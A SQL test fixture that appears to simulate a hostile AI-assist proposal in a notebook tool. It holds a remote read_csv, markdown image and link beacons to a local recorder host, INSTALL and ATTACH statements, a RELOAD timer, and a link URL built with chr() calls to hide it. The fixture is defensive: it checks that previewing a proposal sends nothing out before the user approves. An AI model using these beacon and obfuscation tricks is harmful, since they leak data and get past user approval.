-- #244 fixture: a hostile proposal — a reader of a remote path, a markdown
-- image/link to the recorder, INSTALL and ATTACH, a RELOAD timer, a chart
-- ::LINK with a *computed* (not literal) cross-origin URL, a table ::LINK to
-- a same-origin path, plus one valid chart panel (statement 5 — the fixed
-- index M9's mock `panels: [{stmt: 5, …}]` relies on, so the new statements
-- below are appended after it, not spliced in before).
-- scripts/assist-e2e.mjs substitutes ${REC} with the recorder's port before
-- use; the recorder must stay empty throughout the preview (C-1/R9), and
-- still empty — and the page DB still untouched — after "Apply, don't run"
-- (H-1), a dark toggle, Esc, or any time passing (H-1/L-2, the RELOAD
-- timer), and no click on either ::LINK may navigate or open a window
-- before Apply (H-2).
SELECT * FROM read_csv('http://127.0.0.1:${REC}/preview.csv') ::TABLE;
SELECT '![x](http://127.0.0.1:${REC}/md.png) [go](http://127.0.0.1:${REC}/link)'::MARKDOWN;
INSTALL spatial;
ATTACH 'x.duckdb' AS x;
SELECT region ::XAXIS, ROUND(SUM(units*price),0) ::BARCHART,
       ('http' || chr(58) || chr(47) || chr(47) || '127.0.0.1:${REC}/chartlink?v={value}') ::LINK,
       'Revenue by region'::TITLE
FROM sales GROUP BY 1 ORDER BY 2 DESC;
SELECT 1::RELOAD;
SELECT region AS "Region" ::TABLE, ('/__samepath?r=' || region) AS "Go" ::LINK
FROM sales GROUP BY 1 ORDER BY 1;
